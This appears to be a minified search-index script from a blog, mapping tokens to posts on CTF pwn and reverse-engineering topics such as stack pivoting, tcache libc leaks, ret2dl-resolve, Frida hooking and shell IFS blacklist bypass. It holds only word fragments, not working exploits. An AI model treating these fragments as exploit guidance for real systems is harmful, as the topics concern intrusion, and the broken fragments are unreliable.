40\":1}}],[\"然后发生报错\",{\"1\":{\"41\":1}}],[\"然后直接打印出来\",{\"1\":{\"12\":1}}],[\"然后\",{\"1\":{\"4\":1,\"22\":1,\"41\":1}}],[\"然后执行指令ret\",{\"1\":{\"4\":1}}],[\"然后就会执行\",{\"1\":{\"4\":1}}],[\"​\",{\"1\":{\"4\":1,\"17\":1}}],[\"原理3\",{\"1\":{\"4\":1}}],[\"原理\",{\"1\":{\"4\":1}}],[\"那么就很明确了\",{\"1\":{\"15\":1}}],[\"那么输入指令后我们找到了这个chunk\",{\"1\":{\"9\":1}}],[\"那么第八个的地址\",{\"1\":{\"9\":1}}],[\"那么我们就知道了\",{\"1\":{\"51\":1}}],[\"那么我们如何找到它呢\",{\"1\":{\"9\":1}}],[\"那么我们的rsp也成功完成了迁移工作\",{\"1\":{\"4\":1}}],[\"那么\",{\"1\":{\"4\":1}}],[\"那么同理\",{\"1\":{\"4\":1}}],[\"那么下面是实现原理图\",{\"1\":{\"4\":1}}],[\"那么这个指令的本质\",{\"1\":{\"4\":1}}],[\"else\",{\"1\":{\"50\":1}}],[\"elf\",{\"1\":{\"22\":6}}],[\"eof\",{\"1\":{\"45\":1}}],[\"e\",{\"1\":{\"45\":1}}],[\"echo\",{\"1\":{\"44\":1,\"48\":1}}],[\"error\",{\"1\":{\"41\":1}}],[\"envp\",{\"1\":{\"51\":2}}],[\"enabled\",{\"1\":{\"50\":1}}],[\"enter\",{\"1\":{\"37\":1}}],[\"entries\",{\"1\":{\"8\":2}}],[\"entry\",{\"1\":{\"8\":4}}],[\"entry代表着当前bin的首个chunk\",{\"1\":{\"8\":1}}],[\"enumerateclassloaderssync\",{\"1\":{\"36\":1}}],[\"enumerateloadedclasses\",{\"1\":{\"36\":1,\"41\":1}}],[\"explore\",{\"1\":{\"43\":1}}],[\"explore但是报错\",{\"1\":{\"43\":1}}],[\"expect\",{\"1\":{\"15\":2}}],[\"exit\",{\"1\":{\"41\":2,\"44\":1}}],[\"example\",{\"1\":{\"31\":1,\"33\":2,\"34\":1,\"35\":2,\"36\":2}}],[\"editemo的时候是根据判断emo\",{\"1\":{\"12\":1}}],[\"emo\",{\"1\":{\"11\":1,\"12\":3}}],[\"ezchunk\",{\"0\":{\"10\":1}}],[\"each\",{\"1\":{\"8\":2}}],[\"eip存入我们的read\",{\"1\":{\"4\":1}}],[\"eip\",{\"1\":{\"4\":2}}],[\"esp\",{\"1\":{\"4\":2}}],[\"ebp的\",{\"1\":{\"4\":1}}],[\"ebp的地方\",{\"1\":{\"4\":1}}],[\"ebp的地址上\",{\"1\":{\"3\":1}}],[\"ebp2的地址给了rbp\",{\"1\":{\"4\":1}}],[\"ebp1\",{\"1\":{\"4\":1}}],[\"ebp寄存器\",{\"1\":{\"4\":1}}],[\"ebp\",{\"1\":{\"3\":1,\"4\":4}}],[\"m\",{\"1\":{\"45\":2}}],[\"my\",{\"1\":{\"44\":1}}],[\"more命令\",{\"1\":{\"45\":1}}],[\"more\",{\"1\":{\"41\":1,\"45\":1}}],[\"movq\",{\"1\":{\"20\":1}}],[\"mov\",{\"1\":{\"4\":1}}],[\"microsoft\",{\"1\":{\"41\":1}}],[\"mildly\",{\"1\":{\"8\":1}}],[\"methods\",{\"1\":{\"36\":1,\"41\":4}}],[\"methods=clz\",{\"1\":{\"36\":1}}],[\"main\",{\"1\":{\"31\":2,\"34\":1,\"35\":1,\"41\":3,\"51\":3,\"52\":1}}],[\"map\",{\"1\":{\"20\":2,\"21\":1}}],[\"malloc\",{\"1\":{\"12\":1,\"15\":2}}],[\"malloc的时候优先去tcahe中找\",{\"1\":{\"7\":1}}],[\"max\",{\"1\":{\"6\":1,\"8\":2}}],[\"matter\",{\"1\":{\"0\":1}}],[\"地址后面的内容会被当成栈\",{\"1\":{\"4\":1}}],[\"新的fake\",{\"1\":{\"4\":1}}],[\"这特别有用于处理非标准格式的数据\",{\"1\":{\"47\":1}}],[\"这意味着\",{\"1\":{\"47\":1}}],[\"这对于文本解析\",{\"1\":{\"47\":1}}],[\"这是一个简化的示例\",{\"1\":{\"20\":1}}],[\"这是函数的调用约定所以当我们执行完后read函数后\",{\"1\":{\"4\":1}}],[\"这题存在off\",{\"1\":{\"13\":1}}],[\"这样在远程服务器的时候就可以利用这个偏移获取libc基地址\",{\"1\":{\"9\":1}}],[\"这样就可以实现栈的移动\",{\"1\":{\"4\":1}}],[\"这个key对应的value也是一个callback函数\",{\"1\":{\"35\":1}}],[\"这个key对应的value是一个callback函数\",{\"1\":{\"35\":1}}],[\"这个函数第一个参数就是我们要遍历的类随后我们放入一个类似于回调函数的对象进去这个对象包含\",{\"1\":{\"35\":1}}],[\"这个方法有什么用呢\",{\"1\":{\"34\":1}}],[\"这个参数\",{\"1\":{\"22\":1}}],[\"这个数组到底是怎么存放数据的\",{\"1\":{\"11\":1}}],[\"这个是存size的\",{\"1\":{\"11\":1}}],[\"这个寄存器是存入的我们下一条执行的指令地址\",{\"1\":{\"4\":1}}],[\"这个指令\",{\"1\":{\"4\":1}}],[\"这个操作\",{\"1\":{\"4\":1}}],[\"这个操作之前的栈结构\",{\"1\":{\"4\":1}}],[\"这里举列子\",{\"0\":{\"48\":1}}],[\"这里提到ifs作为shell的内置变量\",{\"1\":{\"46\":1}}],[\"这里放不下\",{\"1\":{\"41\":1}}],[\"这里搜了去\",{\"1\":{\"41\":1}}],[\"这里看教程大概就是\",{\"1\":{\"40\":1}}],[\"这里学习到的\",{\"1\":{\"38\":1}}],[\"这里如果这个函数不是导出函数则我们通过偏移来获取这个函数这个步骤\",{\"1\":{\"37\":1}}],[\"这里很多前提知识\",{\"1\":{\"36\":1}}],[\"这里很关键因为会检查前后chunk中\",{\"1\":{\"15\":1}}],[\"这里会去找到程序中所有实现了指定类的对象\",{\"1\":{\"35\":1}}],[\"这里先解释一下什么是构造方法java中类在定义的时候\",{\"1\":{\"34\":1}}],[\"这里重载函数是java里面的一个特性\",{\"1\":{\"33\":1}}],[\"这里引用一下参考文章的列子\",{\"1\":{\"31\":1}}],[\"这里也可以在启动后再\",{\"1\":{\"28\":1}}],[\"这里的存储数据为0xc7df9b0041348000\",{\"1\":{\"51\":1}}],[\"这里的字段指的是类中定义的成员属性然后这里修改非静态的字段用到的是java\",{\"1\":{\"35\":1}}],[\"这里的\",{\"1\":{\"28\":1}}],[\"这里的function\",{\"1\":{\"22\":1}}],[\"这里写了一个大概的源码\",{\"1\":{\"20\":1}}],[\"这里写个小插曲\",{\"1\":{\"3\":1}}],[\"这里相当于\",{\"1\":{\"20\":1}}],[\"这里相当于让前后的chunk连接起来了\",{\"1\":{\"15\":1}}],[\"这里我们拿到包名字\",{\"1\":{\"40\":1}}],[\"这里我们假设解析后的地址已经由\",{\"1\":{\"20\":1}}],[\"这里我们不对plt和got表内详细内容进行介绍了\",{\"1\":{\"20\":1}}],[\"这里我们就得到了偏移\",{\"1\":{\"9\":1}}],[\"这里等效为\",{\"1\":{\"15\":1}}],[\"这里tcache\",{\"1\":{\"8\":1}}],[\"这里需要注意eip这个寄存器很特殊\",{\"1\":{\"4\":1}}],[\"这里就是pop\",{\"1\":{\"4\":1}}],[\"这里是执行mov\",{\"1\":{\"4\":1}}],[\"这里说一下我自己的浅薄理解\",{\"1\":{\"4\":1}}],[\"这里好好学一下栈迁移这个知识点\",{\"1\":{\"2\":1}}],[\"ls\",{\"1\":{\"44\":1}}],[\"lang\",{\"1\":{\"35\":1}}],[\"layout\",{\"1\":{\"0\":2}}],[\"let\",{\"1\":{\"50\":1,\"52\":1}}],[\"less\",{\"1\":{\"45\":6}}],[\"less命令\",{\"1\":{\"45\":1}}],[\"length\",{\"1\":{\"33\":3,\"36\":1,\"41\":1}}],[\"leaver\",{\"1\":{\"37\":1}}],[\"leave指令\",{\"1\":{\"4\":1}}],[\"leave|ret\",{\"1\":{\"3\":1}}],[\"long\",{\"1\":{\"45\":3}}],[\"local\",{\"1\":{\"41\":1}}],[\"location\",{\"1\":{\"41\":1,\"43\":1}}],[\"logger\",{\"1\":{\"35\":1}}],[\"log\",{\"1\":{\"31\":1,\"33\":2,\"35\":3,\"36\":3,\"37\":2,\"41\":3}}],[\"load\",{\"1\":{\"28\":1}}],[\"low\",{\"1\":{\"8\":1}}],[\"l\",{\"1\":{\"28\":1,\"41\":2}}],[\"little\",{\"1\":{\"50\":1}}],[\"line=\",{\"1\":{\"48\":1}}],[\"lines=\",{\"1\":{\"45\":1}}],[\"lines\",{\"1\":{\"45\":1}}],[\"line\",{\"1\":{\"45\":1}}],[\"linux中常用的指令\",{\"0\":{\"45\":1}}],[\"link\",{\"1\":{\"20\":1,\"21\":1}}],[\"linked\",{\"1\":{\"8\":1,\"15\":1}}],[\"lib\",{\"1\":{\"37\":1}}],[\"libnative\",{\"1\":{\"37\":1}}],[\"libcbaseaddr\",{\"1\":{\"37\":1}}],[\"libc基地址0x7f566bb4f000=偏移0x3ac78\",{\"1\":{\"9\":1}}],[\"list\",{\"1\":{\"8\":1,\"15\":1}}],[\"rodata\",{\"1\":{\"51\":1}}],[\"ropgadget\",{\"1\":{\"3\":1}}],[\"raw\",{\"1\":{\"45\":1}}],[\"rax\",{\"1\":{\"20\":5,\"51\":3}}],[\"r\",{\"1\":{\"22\":9,\"45\":1,\"52\":5}}],[\"rsi\",{\"1\":{\"20\":2}}],[\"rsp+2ch\",{\"1\":{\"50\":1,\"51\":1}}],[\"rsp+0h\",{\"1\":{\"50\":1}}],[\"rsp向下跑一下\",{\"1\":{\"4\":1}}],[\"rsp向下移动一格\",{\"1\":{\"4\":1}}],[\"rsp\",{\"1\":{\"4\":1,\"20\":1}}],[\"rsp定位的\",{\"1\":{\"4\":1}}],[\"rdi\",{\"1\":{\"20\":1}}],[\"rdx\",{\"1\":{\"20\":2}}],[\"rcx\",{\"1\":{\"20\":2}}],[\"runtime\",{\"0\":{\"21\":1},\"1\":{\"20\":8,\"21\":2}}],[\"rbp\",{\"1\":{\"4\":1,\"50\":2,\"51\":1}}],[\"recvuntil\",{\"1\":{\"52\":1}}],[\"reg\",{\"1\":{\"51\":1}}],[\"remote\",{\"1\":{\"41\":1,\"52\":1}}],[\"re\",{\"1\":{\"41\":1}}],[\"resuming\",{\"1\":{\"41\":1}}],[\"res\",{\"1\":{\"31\":3,\"33\":3}}],[\"resolve部分详细解说\",{\"0\":{\"21\":1}}],[\"resolve函数\",{\"1\":{\"20\":2}}],[\"resolve\",{\"1\":{\"20\":6,\"21\":2}}],[\"relro\",{\"1\":{\"50\":2}}],[\"rel\",{\"1\":{\"22\":9}}],[\"reloc\",{\"0\":{\"22\":1},\"1\":{\"20\":3,\"21\":1,\"22\":2}}],[\"related\",{\"1\":{\"0\":1}}],[\"reasons\",{\"1\":{\"8\":1}}],[\"redundant\",{\"1\":{\"8\":1}}],[\"retval\",{\"1\":{\"37\":1}}],[\"return\",{\"1\":{\"31\":1,\"33\":6,\"50\":2,\"51\":1}}],[\"ret2dl\",{\"0\":{\"18\":1}}],[\"ret指令的地方\",{\"1\":{\"4\":1}}],[\"ret\",{\"1\":{\"4\":2,\"20\":1}}],[\"ret这个gadget将esp劫持到fake\",{\"1\":{\"3\":1}}],[\"$fruit\",{\"1\":{\"48\":1}}],[\"$line\",{\"1\":{\"48\":1}}],[\"$$`\",{\"1\":{\"44\":1}}],[\"$$\",{\"1\":{\"44\":1}}],[\"$new\",{\"1\":{\"34\":1}}],[\"$init\",{\"1\":{\"34\":2}}],[\"$\",{\"1\":{\"3\":1,\"44\":12}}],[\"因为这些寄存器会在\",{\"1\":{\"20\":1}}],[\"因为\",{\"1\":{\"4\":1}}],[\"因为我们使用的栈其实本质就是基于rbp\",{\"1\":{\"4\":1}}],[\"因为我们常使用leave\",{\"1\":{\"4\":1}}],[\"因为大多数时候我都是去ida直接找的这个gadget\",{\"1\":{\"3\":1}}],[\"因为已经遇到了很多次了\",{\"1\":{\"2\":1}}],[\"确实重要\",{\"1\":{\"2\":1}}],[\"简单栈迁移\",{\"0\":{\"1\":1}}],[\"pie\",{\"1\":{\"50\":2}}],[\"ptr\",{\"1\":{\"37\":2}}],[\"puts\",{\"1\":{\"50\":2}}],[\"public\",{\"1\":{\"33\":5,\"34\":4,\"35\":6}}],[\"pushq\",{\"1\":{\"20\":3}}],[\"push\",{\"1\":{\"20\":2}}],[\"partial\",{\"1\":{\"50\":1}}],[\"payload\",{\"0\":{\"49\":1},\"1\":{\"52\":2}}],[\"package\",{\"1\":{\"34\":1}}],[\"pause意思是在程序启动后不要停止程序的进程\",{\"1\":{\"28\":1}}],[\"pause\",{\"1\":{\"28\":2,\"41\":3}}],[\"page\",{\"1\":{\"0\":2}}],[\"ps\",{\"1\":{\"25\":1}}],[\"pc查询手机的进程\",{\"0\":{\"25\":1}}],[\"prompt\",{\"1\":{\"45\":2}}],[\"proversion\",{\"1\":{\"44\":1}}],[\"private\",{\"1\":{\"35\":2}}],[\"printf\",{\"1\":{\"51\":2}}],[\"println\",{\"1\":{\"35\":1}}],[\"printstudent\",{\"1\":{\"35\":1}}],[\"print\",{\"1\":{\"34\":1,\"44\":2,\"51\":1,\"52\":1}}],[\"printerr\",{\"1\":{\"15\":2}}],[\"printemo是根据emo\",{\"1\":{\"12\":1}}],[\"prev\",{\"1\":{\"15\":2}}],[\"p\",{\"1\":{\"14\":2,\"15\":26,\"43\":1}}],[\"posts\",{\"0\":{\"53\":1}}],[\"point\",{\"1\":{\"11\":4}}],[\"popq\",{\"1\":{\"20\":3}}],[\"pop操作我们的rsp向下移动一格\",{\"1\":{\"4\":1}}],[\"pop\",{\"1\":{\"4\":3}}],[\"perform\",{\"1\":{\"30\":1,\"31\":1,\"41\":1}}],[\"performance\",{\"1\":{\"8\":1}}],[\"per\",{\"1\":{\"8\":1}}],[\"perthread\",{\"1\":{\"8\":5}}],[\"plt>\",{\"1\":{\"51\":1}}],[\"plt存我们需要\",{\"1\":{\"22\":1}}],[\"plt这个数组的下标\",{\"1\":{\"22\":1}}],[\"plt这里\",{\"1\":{\"4\":1}}],[\"plt\",{\"1\":{\"4\":1,\"20\":2,\"22\":4,\"51\":1}}],[\"please\",{\"1\":{\"0\":1}}],[\"pwn1\",{\"0\":{\"50\":1},\"1\":{\"50\":2,\"52\":1}}],[\"pwn\",{\"1\":{\"3\":1,\"14\":1,\"50\":1,\"52\":1}}],[\"dd\",{\"1\":{\"51\":1}}],[\"display\",{\"1\":{\"41\":1}}],[\"displays\",{\"1\":{\"41\":1}}],[\"dick\",{\"1\":{\"34\":2}}],[\"dynamic\",{\"1\":{\"41\":1}}],[\"dynsym中哪个结构体\",{\"1\":{\"22\":1}}],[\"dynsym存函数名字在\",{\"1\":{\"22\":1}}],[\"dynsym\",{\"1\":{\"22\":2}}],[\"dynsym这个数组的下标\",{\"1\":{\"22\":1}}],[\"dynstr中的位置\",{\"1\":{\"22\":1}}],[\"dynstr存函数名字\",{\"1\":{\"22\":1}}],[\"dynstr数组中的下标\",{\"1\":{\"22\":1}}],[\"dynstr\",{\"1\":{\"22\":2}}],[\"d\",{\"1\":{\"35\":1}}],[\"dl\",{\"0\":{\"21\":1},\"1\":{\"20\":20,\"21\":2}}],[\"done\",{\"1\":{\"48\":1}}],[\"do\",{\"1\":{\"48\":1}}],[\"double\",{\"1\":{\"15\":1}}],[\"docs\",{\"1\":{\"0\":1,\"41\":1}}],[\"debug\",{\"1\":{\"52\":1}}],[\"default\",{\"1\":{\"41\":1,\"43\":1}}],[\"define\",{\"1\":{\"14\":1}}],[\"demo\",{\"1\":{\"0\":1}}],[\"dword\",{\"1\":{\"11\":2,\"51\":1}}],[\"found\",{\"1\":{\"50\":1}}],[\"format\",{\"1\":{\"51\":1}}],[\"forward\",{\"1\":{\"24\":1}}],[\"for\",{\"1\":{\"0\":1,\"8\":2,\"33\":1,\"36\":2,\"41\":1,\"44\":1,\"48\":1}}],[\"flag\",{\"1\":{\"50\":1}}],[\"flags\",{\"1\":{\"35\":1}}],[\"float\",{\"1\":{\"50\":1,\"51\":2}}],[\"file\",{\"1\":{\"45\":8}}],[\"findbaseaddress\",{\"1\":{\"37\":1}}],[\"fixup\",{\"1\":{\"20\":11}}],[\"fixup然后这个函数将真实的地址返回给rax寄存器\",{\"1\":{\"20\":1}}],[\"fun=new\",{\"1\":{\"37\":1}}],[\"func\",{\"1\":{\"37\":1,\"50\":1}}],[\"func=parseint\",{\"1\":{\"37\":1}}],[\"function\",{\"1\":{\"20\":2,\"22\":1,\"30\":1,\"31\":2,\"32\":1,\"33\":2,\"34\":1,\"35\":3,\"36\":3,\"37\":3,\"41\":4}}],[\"fun\",{\"1\":{\"37\":2}}],[\"f\",{\"1\":{\"28\":2,\"41\":2,\"45\":2,\"51\":4}}],[\"fd或者bk\",{\"1\":{\"15\":1}}],[\"fd\",{\"1\":{\"14\":2,\"15\":5}}],[\"from\",{\"1\":{\"52\":1}}],[\"front\",{\"1\":{\"0\":1}}],[\"fruit\",{\"1\":{\"48\":1}}],[\"frida的反调试\",{\"0\":{\"38\":1}}],[\"frida的基本使用\",{\"0\":{\"23\":1}}],[\"frida\",{\"1\":{\"23\":1,\"25\":1,\"28\":2,\"41\":7,\"43\":1}}],[\"free后\",{\"1\":{\"7\":1}}],[\"free后打印出main\",{\"1\":{\"6\":1}}],[\"failed\",{\"1\":{\"41\":1}}],[\"fast的chunk或者fast\",{\"1\":{\"6\":1}}],[\"fast\",{\"1\":{\"6\":2}}],[\"fake\",{\"1\":{\"4\":1}}],[\"idc\",{\"1\":{\"51\":2}}],[\"id=socket\",{\"1\":{\"41\":1}}],[\"ignore\",{\"1\":{\"45\":1}}],[\"its\",{\"1\":{\"41\":1,\"43\":1,\"50\":1}}],[\"i<methods\",{\"1\":{\"36\":2}}],[\"i<overlength\",{\"1\":{\"33\":1}}],[\"i++\",{\"1\":{\"33\":1,\"36\":2,\"41\":1}}],[\"i=0\",{\"1\":{\"33\":1,\"36\":2}}],[\"import\",{\"1\":{\"35\":1,\"44\":1,\"51\":1,\"52\":1}}],[\"important\",{\"1\":{\"8\":1}}],[\"implementation=function\",{\"1\":{\"31\":1,\"33\":2,\"34\":1}}],[\"implementations\",{\"1\":{\"31\":1,\"32\":1}}],[\"ifs=\",{\"1\":{\"48\":1}}],[\"ifs变量\",{\"0\":{\"46\":1}}],[\"ifs\",{\"0\":{\"47\":1},\"1\":{\"44\":1,\"47\":3}}],[\"if\",{\"1\":{\"15\":2,\"36\":2,\"41\":1,\"44\":1,\"45\":1,\"50\":1}}],[\"i这个是emo\",{\"1\":{\"11\":1}}],[\"i\",{\"1\":{\"11\":7,\"33\":1,\"36\":3,\"41\":3,\"44\":2,\"45\":1}}],[\"include<stdio\",{\"1\":{\"51\":1}}],[\"init\",{\"1\":{\"45\":1}}],[\"input\",{\"1\":{\"44\":1}}],[\"instrumentation\",{\"1\":{\"41\":1}}],[\"inetcache\",{\"1\":{\"41\":1}}],[\"information\",{\"1\":{\"41\":1}}],[\"info高位3字节\",{\"1\":{\"22\":1}}],[\"info\",{\"1\":{\"22\":6,\"23\":1,\"41\":1}}],[\"indexof\",{\"1\":{\"36\":2,\"41\":1}}],[\"index知道我们要绑定函数的名字\",{\"1\":{\"22\":1}}],[\"index\",{\"0\":{\"22\":1},\"1\":{\"11\":1,\"21\":1,\"22\":2}}],[\"interactive\",{\"1\":{\"52\":1}}],[\"interceptor\",{\"1\":{\"37\":1}}],[\"int64\",{\"1\":{\"22\":1}}],[\"int\",{\"1\":{\"11\":3,\"22\":1,\"33\":5,\"35\":3,\"50\":1,\"51\":3}}],[\"int类型\",{\"1\":{\"11\":1}}],[\"in\",{\"1\":{\"0\":1,\"44\":2,\"48\":1}}],[\"isoc99\",{\"1\":{\"51\":2}}],[\"isused被设置为0\",{\"1\":{\"12\":1}}],[\"isused来判断是否存在的\",{\"1\":{\"12\":1}}],[\"isused\",{\"1\":{\"11\":1}}],[\"is\",{\"1\":{\"0\":1,\"8\":3,\"41\":1,\"43\":1,\"51\":2}}],[\"be\",{\"1\":{\"50\":1}}],[\"banana\",{\"1\":{\"48\":2}}],[\"base\",{\"1\":{\"37\":2}}],[\"blacklist\",{\"1\":{\"44\":2}}],[\"bloghome\",{\"1\":{\"0\":1}}],[\"blog\",{\"0\":{\"0\":1},\"1\":{\"0\":2}}],[\"b=456\",{\"1\":{\"31\":1}}],[\"b\",{\"1\":{\"31\":3,\"33\":1,\"45\":1,\"52\":3}}],[\"book123\",{\"1\":{\"23\":1}}],[\"both\",{\"1\":{\"0\":1}}],[\"builtin\",{\"1\":{\"15\":2}}],[\"bk去获取前面一个chunk的fd和后面一个chunk的bk\",{\"1\":{\"15\":1}}],[\"bk\",{\"1\":{\"14\":2,\"15\":4}}],[\"byref\",{\"1\":{\"50\":1,\"51\":1}}],[\"bytes=\",{\"1\":{\"45\":1}}],[\"by\",{\"1\":{\"13\":1}}],[\"bin里面\",{\"1\":{\"9\":1}}],[\"bin\",{\"1\":{\"7\":1}}],[\"bin放满了\",{\"1\":{\"7\":1}}],[\"bin中\",{\"1\":{\"6\":1}}],[\"bins\",{\"1\":{\"6\":1,\"8\":2,\"9\":1}}],[\"bins中\",{\"1\":{\"6\":1}}],[\"binary\",{\"1\":{\"3\":1}}],[\"scanf\",{\"1\":{\"51\":3}}],[\"screen\",{\"1\":{\"45\":1}}],[\"siscn\",{\"0\":{\"50\":1}}],[\"size是否与p的大小相同\",{\"1\":{\"15\":1}}],[\"size\",{\"1\":{\"8\":1,\"11\":1,\"12\":1,\"15\":3}}],[\"space\",{\"1\":{\"45\":1}}],[\"spawned\",{\"1\":{\"41\":1}}],[\"spawn\",{\"1\":{\"41\":1}}],[\"s\",{\"1\":{\"45\":1,\"50\":1,\"52\":1}}],[\"shell\",{\"1\":{\"44\":1,\"47\":4}}],[\"should\",{\"1\":{\"0\":1,\"50\":1}}],[\"so\",{\"1\":{\"37\":5,\"41\":1}}],[\"so名称\",{\"1\":{\"37\":1}}],[\"so中的函数\",{\"0\":{\"37\":1}}],[\"so中\",{\"1\":{\"6\":1}}],[\"system\",{\"1\":{\"34\":1,\"35\":2,\"41\":1,\"44\":1,\"50\":1}}],[\"sym\",{\"1\":{\"22\":2}}],[\"stack\",{\"1\":{\"50\":1}}],[\"static\",{\"1\":{\"8\":1,\"33\":4,\"34\":1,\"35\":2}}],[\"student\",{\"1\":{\"31\":2,\"33\":5,\"34\":4,\"35\":6}}],[\"student=java\",{\"1\":{\"31\":1,\"33\":2,\"34\":1,\"35\":1}}],[\"str\",{\"1\":{\"33\":2}}],[\"string\",{\"1\":{\"11\":2,\"33\":4,\"34\":1,\"35\":4}}],[\"struct\",{\"1\":{\"8\":8,\"11\":1,\"22\":1}}],[\"st\",{\"1\":{\"11\":4,\"22\":5}}],[\"st数据看起来是关键\",{\"1\":{\"11\":1}}],[\"sendline\",{\"1\":{\"52\":1}}],[\"search\",{\"1\":{\"45\":1}}],[\"server\",{\"1\":{\"43\":1}}],[\"see\",{\"1\":{\"0\":1}}],[\"setimmediate\",{\"1\":{\"31\":1,\"41\":1}}],[\"set\",{\"1\":{\"0\":1}}],[\"you\",{\"1\":{\"0\":1}}],[\"tail命令\",{\"1\":{\"45\":1}}],[\"target\",{\"1\":{\"41\":1}}],[\"txt\",{\"1\":{\"45\":4}}],[\"test2\",{\"1\":{\"33\":1}}],[\"test\",{\"1\":{\"33\":10,\"34\":7,\"41\":1}}],[\"tencent\",{\"1\":{\"14\":1}}],[\"tcp\",{\"1\":{\"24\":2}}],[\"tcache位于heap最前端\",{\"1\":{\"9\":1}}],[\"tcache\",{\"1\":{\"8\":12}}],[\"tcache缓存的是非large\",{\"1\":{\"7\":1}}],[\"tcache机制\",{\"1\":{\"7\":1}}],[\"tcahe机制\",{\"0\":{\"7\":1}}],[\"tcahe机制+泄露libc地址\",{\"0\":{\"5\":1}}],[\"type\",{\"1\":{\"11\":1,\"20\":2,\"22\":1}}],[\"typedef\",{\"1\":{\"8\":2}}],[\"time\",{\"1\":{\"8\":1}}],[\"that\",{\"1\":{\"8\":1}}],[\"thread\",{\"1\":{\"8\":3,\"41\":1}}],[\"these\",{\"1\":{\"8\":1}}],[\"there\",{\"1\":{\"8\":1}}],[\"the\",{\"1\":{\"0\":1,\"8\":2,\"41\":1,\"43\":1,\"50\":1,\"51\":2,\"52\":1}}],[\"this\",{\"1\":{\"0\":2,\"8\":1,\"31\":1,\"32\":1,\"33\":3,\"34\":1,\"35\":4}}],[\"true\",{\"1\":{\"0\":1,\"44\":1}}],[\"toolkit\",{\"1\":{\"41\":1}}],[\"to\",{\"1\":{\"0\":1,\"41\":3,\"43\":3}}],[\"anna\",{\"1\":{\"52\":1}}],[\"android\",{\"0\":{\"54\":1},\"1\":{\"23\":1,\"41\":2,\"43\":1}}],[\"and\",{\"1\":{\"0\":1,\"8\":1}}],[\"amd64\",{\"1\":{\"50\":1}}],[\"at\",{\"1\":{\"41\":1,\"45\":1}}],[\"attach\",{\"1\":{\"37\":1,\"41\":1,\"43\":1}}],[\"about\",{\"1\":{\"41\":1}}],[\"agentalbrazee\",{\"1\":{\"50\":1}}],[\"age\",{\"1\":{\"34\":1,\"35\":4}}],[\"apple\",{\"1\":{\"48\":2}}],[\"apply\",{\"1\":{\"33\":1}}],[\"appdata\",{\"1\":{\"41\":1}}],[\"apk\",{\"1\":{\"28\":2}}],[\"a+b\",{\"1\":{\"33\":1}}],[\"a=123\",{\"1\":{\"31\":1,\"33\":1}}],[\"adb\",{\"1\":{\"24\":1}}],[\"add\",{\"1\":{\"31\":2,\"33\":1,\"37\":2}}],[\"add方法\",{\"1\":{\"31\":1}}],[\"addemo函数内部\",{\"1\":{\"11\":1}}],[\"addr=module\",{\"1\":{\"37\":1}}],[\"addr\",{\"1\":{\"4\":1,\"37\":1}}],[\"arch\",{\"1\":{\"50\":1}}],[\"arrow\",{\"1\":{\"45\":1}}],[\"art\",{\"1\":{\"44\":2}}],[\"arm64\",{\"1\":{\"41\":1}}],[\"argv\",{\"1\":{\"51\":2}}],[\"argc\",{\"1\":{\"51\":2}}],[\"args\",{\"1\":{\"34\":1,\"35\":1,\"37\":1}}],[\"arguments\",{\"1\":{\"33\":2,\"41\":1}}],[\"arg参数作为参数这里plt\",{\"1\":{\"20\":1}}],[\"arg\",{\"1\":{\"20\":3}}],[\"are\",{\"1\":{\"8\":1}}],[\"arena的地址\",{\"1\":{\"9\":1}}],[\"arena的实际地址\",{\"1\":{\"6\":1}}],[\"arena+88\",{\"1\":{\"9\":1}}],[\"arena中\",{\"1\":{\"6\":1}}],[\"av\",{\"1\":{\"14\":1}}],[\"after\",{\"1\":{\"6\":1}}],[\"a\",{\"1\":{\"0\":1,\"31\":3,\"33\":4,\"34\":3,\"41\":1,\"51\":5,\"52\":1}}]],\"serializationVersion\":2}}")).map(([e,t])=>[e,zt(t,{fields:["h","t","c"],storeFields:["h","t","c"]})]));self.onmessage=({data:{type:e="all",query:t,locale:s,options:n}})=>{e==="suggest"?self.postMessage(st(t,v[s],n)):e==="search"?self.postMessage(et(t,v[s],n)):self.postMessage({suggestions:st(t,v[s],n),results:et(t,v[s],n)})};
//# sourceMappingURL=index.js.map
